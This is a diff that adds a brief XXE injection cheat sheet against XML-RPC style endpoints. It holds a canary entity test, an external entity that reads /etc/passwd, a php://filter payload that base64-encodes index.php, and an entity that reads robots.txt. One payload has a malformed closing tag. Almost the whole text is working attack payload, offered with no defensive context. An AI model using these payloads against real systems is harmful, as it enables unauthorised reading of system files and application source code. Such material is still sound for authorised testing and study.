@@ -1,0 +1,36 @@
+INTETIFY XXE VULNERABILITIES 
+
+
+
+<!DOCTYPE a 
+[<!ENTITY CANARY "Injection Happend!">]
+>
+<methodCall><methodName>&CANARY;</methodName></methodCall>
+
+
+** System call
+
+<!DOCTYPE a 
+[<!ENTITY CANARY SYSTEM "file:///etc/passwd">]
+>
+<methodCall><methodName>&CANARY;</methodName></methodCall>
+
+
+** System call on base64 encoding 
+
+<!DOCTYPE a 
+[<!ENTITY CANARY SYSTEM "php://filter/convert.base64-encode/resource=index.php">]
+>
+<methodCall><methodName>&CANARY;</methodName></methodCall>
+
+
+
+** Another way for system call
+
+<?xml version="1.0"?>
+<!DOCTYPE change-log [
+    <!ENTITY systemEntity SYSTEM "robots.txt">
+]>
+<change-log>
+    <text<&systemEntity;</text>
+</change-log>        
